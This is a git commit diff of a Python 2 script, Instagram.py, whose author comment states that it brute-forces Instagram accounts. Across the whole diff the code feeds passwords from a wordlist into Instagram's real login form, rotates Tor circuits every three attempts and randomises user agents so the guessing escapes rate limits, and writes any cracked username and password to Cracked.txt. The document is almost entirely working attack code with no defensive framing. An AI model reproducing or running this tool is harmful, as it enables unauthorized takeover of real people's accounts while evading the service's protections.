09f0003c5db3d67419950566658593338519c7aa
Ethical-H4CK3R <Ethical.Hacker720@gmail.com>
2017-03-29 20:37:46 -0400

    Add files via upload

--- Instagram.py
+++ Instagram.py
@@ -1,26 +1,26 @@
 #!/usr/bin/env python
 #
 # @Author: ETHICAL H4CK3R
-# Distro:  Kali Linux 2.0 
-# 
+# Distro:  Kali Linux 2.0
+#
 # TODO: Brute Force Instagram Accounts
 #
 import os
 import time
 import socks
 import socket
-import signal
 import random
 import datetime
+import mechanize
 import cookielib
-import subprocess 
+import subprocess
 
 from Core.art import Colors
 from Core.art import Display
 
-def Setup_Mechanize():  
+def SetupMechanize():
   global Br
-  Br=mechanize.Browser(history=Void())
+  Br=mechanize.Browser()
   CJ=cookielib.LWPCookieJar()
   Br.set_cookiejar(CJ)
   Br.set_handle_equiv(True)
@@ -31,31 +31,29 @@ def Setup_Mechanize():
   Br.addheaders=[('User-agent',random.choice(Agents))]
   Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 
-class Void(object): 
- def add(self, *args, **kargs):pass 
- def clear(self):pass 
-
-def Brute_Force(Email,Pass):
+def BruteForce(Email,Pass):
   try:
    Br.select_form(nr=0)
    Br.form['username']=Email
    Br.form['password']=Pass
-   Br.submit()
+   try:Br.submit()
+   except:pass
    if Br.geturl() != Url:
-    Access_Granted(Email,Pass)
-  except KeyboardInterrupt:Exit()
-   
+    AccessGranted(Email,Pass)
+  except KeyboardInterrupt:
+   print'\n';Exit()
+
 def Connect(address, timeout=None, source_address=None):
   sock=socks.socksocket()
   sock.connect(address)
   return sock
 
-def Obtain_Proxy_IP():
+def ObtainProxyIP():
   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
   socket.socket=socks.socksocket
   socket.Connect=Connect
-  
-def User_Input(Logins=[]):
+
+def UserInput(Logins=[]):
   subprocess.call(['clear']);print art
   for i in range(11):print'\n'
   try:
@@ -63,15 +61,14 @@ def User_Input(Logins=[]):
    Passlist=raw_input('{}[{}-{}]{} Enter Passlist:{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
    return Email,Passlist
   except KeyboardInterrupt:
-   Exit()
+   print'\n';Exit()
 
-def Exit():  
-  print '{}'.format(Red)
+def Exit():
+  print exit0 if not found else exit1
   subprocess.call(['service','tor','stop'])
-  os.kill(os.getpid(),signal.SIGTERM)
-  exit() 
-      
-def Install_Tor():
+  exit()
+
+def InstallTor():
   subprocess.call(['clear'])
   time.sleep(0.7)
   print '[!] Installing Tor ...';time.sleep(0.7);
@@ -80,15 +77,15 @@ def Install_Tor():
   subprocess.call(['apt-get','install','--fix-missing'])
 
 def Refresh():
-  try:  
-   Restart_Tor()
-   Obtain_Proxy_IP()
-   Setup_Mechanize()
+  try:
+   RestartTor()
+   ObtainProxyIP()
+   SetupMechanize()
    time.sleep(3)
   except KeyboardInterrupt:
-   Exit()
+   print'\n';Exit()
 
-def Restart_Tor():
+def RestartTor():
   subprocess.call(['service','tor','restart'])
   time.sleep(1)
 
@@ -99,27 +96,26 @@ def Message(Email):
   print '{}[{}!{}]{} Brute Force In Progress ...{}'.format(Red,Yellow,Red,Yellow,White)
   print '{}[{}-{}]{} Email: {}{}{}'.format(Red,Yellow,Red,White,Yellow,Email,White)
   print '{}[{}-{}]{} Pass:  {}{}{}'.format(Red,Yellow,Red,White,Yellow,passwrd,White)
-  print '{}[{}*{}]{} Attempts: {}{}{}'.format(Red,Yellow,Red,White,Yellow,attempt,White)
+  print '{}[{}-{}]{} Attempts: {}{}{}'.format(Red,Yellow,Red,White,Yellow,attempt,White)
 
-def Current_Time():
+def CurrentTime():
   now  = datetime.datetime.now()
   time = now.strftime("%Y-%m-%d %H:%M")
   date = time[:10]
   mins = time[-3:]
   hrs  = int(time[-5:-3])
   zone = 'am'
-
   if hrs > 12:
    hrs  = hrs-12
    zone = 'pm'
-
   return '{} {}{} {}'.format(date,hrs,mins,zone)
 
-def Access_Granted(email,password):
+def AccessGranted(email,password):
+  global found;found=True
   with open('Cracked.txt','a') as File:
-   File.write('Username: {}\nPassword: {}\nTime Started: {}\nTime Accessed: {}\n\n'.format(email,password,Time_Started,Current_Time()))
+   File.write('Username: {}\nPassword: {}\nTime Started: {}\nTime Accessed: {}\n\n'.format(email,password,TimeStarted,CurrentTime()))
   Exit()
-  
+
 if __name__ == '__main__':
   if os.getuid():
    exit('{}[{}!{}]{} Root Access Required'.format(Red,Yellow,Red,Blue))
@@ -127,40 +123,35 @@ if __name__ == '__main__':
   Red,Blue,Green,Yellow,White=Colors[0],Colors[1],Colors[2],Colors[3],Colors[4]
 
   art=Display()
-  Attempt,attempt=1,1
+  Attempt,attempt,found=1,1,False
   Url='https://www.instagram.com/accounts/login/?force_classic_login'
-  
+
   Agents=[( 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
 	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
 	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
 	      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36' )]
- 
-  if not os.path.exists('/usr/bin/tor'):Install_Tor()
-  from Core.Conf import ReWrite
-  ReWrite()
-  
-  try:import mechanize
-  except ImportError: 
-   call(['clear'])
-   print '[!] Installing Mechanize ...';time.sleep(0.9);
-   call(['pip','install','mechanize'])
-  finally:import mechanize
 
-  Input = User_Input()
+  if not os.path.exists('/usr/bin/tor'):InstallTor()
+  from Core.Conf import ReWrite
+
+  exit0 = '{}[{}-{}]{} Password Found: {}False'.format(Red,Yellow,Red,White,Red)
+  exit1 = '{}[{}-{}]{} Password Found: {}True'.format(Red,Yellow,Red,White,Green)
+  Input = UserInput()
   Email = Input[0]
   Pass  = Input[1]
- 
+
   ReWrite();Refresh();Br.open(Url)
-  Time_Started=Current_Time()
+  TimeStarted=CurrentTime()
   with open(Pass,'r') as File:
    for passwrd in File:
-    if not len(passwrd):continue 
+    if not len(passwrd):continue
     try:
      passwrd = passwrd.replace('\n','')
      Message(Email)
-     Brute_Force(Email,passwrd)
+     BruteForce(Email,passwrd)
      if Attempt==3:Refresh();Br.open(Url);Attempt=0
      Attempt+=1
      attempt+=1
-    except KeyboardInterrupt:Exit()
+    except KeyboardInterrupt:
+     print'\n';Exit()
   Exit()
